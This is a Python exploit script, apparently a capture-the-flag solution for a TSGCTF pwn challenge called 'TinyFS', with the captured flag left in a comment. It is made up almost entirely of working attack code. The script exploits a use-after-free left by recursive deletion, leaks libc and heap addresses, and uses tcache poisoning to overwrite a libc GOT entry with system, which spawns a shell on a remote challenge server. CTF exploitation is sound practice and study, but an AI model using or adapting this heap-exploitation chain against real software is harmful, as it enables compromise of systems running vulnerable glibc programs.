#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./ld-2.37.so --library-path . {}'.format(bin_file).split(), 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':'./ld-2.37.so --library-path . {}'.format(bin_file).split()}, \
                        remote  = {'host':'34.146.195.242', 'port':31415})
env.select()

#==========

binf = ELF(bin_file)

libc = ELF('libc-2.37.so')
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    tfs = TinyFS(conn)

    tfs.mkdir(b'dir1')
    tfs.cd(b'dir1')

    for i in range(8):
        tfs.touch(str(i).encode())
    tfs.mkdir(b'dir1x1')

    tfs.cd(b'/dir1/dir1x1')
    tfs.cd(b'..')
    tfs.cd(b'..')

    tfs.rm(b'dir1')
    tfs.cd(b'/dir1/dir1x1')
    tfs.cd(b'..')

    addr_libc_mainarena = u(tfs.cat(b'0')) - 0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_got       = libc.sep_section['.got.plt']
    addr_libc_system    = libc.sep_function['system']

    addr_heap_base = u(tfs.cat(b'7')) << 12
    info('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))

    tfs.mod(b'1', p64((addr_libc_got + 0x18) ^ (addr_heap_base >> 12)))

    tfs.touch(b'X')
    tfs.mod(b'X', b'/bin/sh\x00')
    tfs.touch(b'Y')
    tfs.mod(b'Y', b'a'*0x80+p64(addr_libc_system))

    conn.sendlineafter(b'$ ', b'cat X')

class TinyFS:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def mkdir(self, name):
        self.sendlineafter(b'$ ', b'mkdir '+name)

    def touch(self, name):
        self.sendlineafter(b'$ ', b'touch '+name)

    def cd(self, path):
        self.sendlineafter(b'$ ', b'cd '+path)

    def rm(self, name):
        self.sendlineafter(b'$ ', b'rm '+name)

    def ls(self):
        self.sendlineafter(b'$ ', b'ls')
        content = self.recvuntil(b'\n$ ', drop=True)
        self.unrecv(b'$ ')
        return content.split()

    def cat(self, name):
        self.sendlineafter(b'$ ', b'cat '+name)
        content = self.recvuntil(b'\n$ ', drop=True)
        self.unrecv(b'$ ')
        return content

    def mod(self, name, content):
        self.sendlineafter(b'$ ', b'mod '+name)
        self.sendlineafter(b'> ', content)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # TSGCTF{de1eting_fi1e5_recur5ive1y_5ave5_y0ur_1ife}

if __name__=='__main__':
    main()

#==========
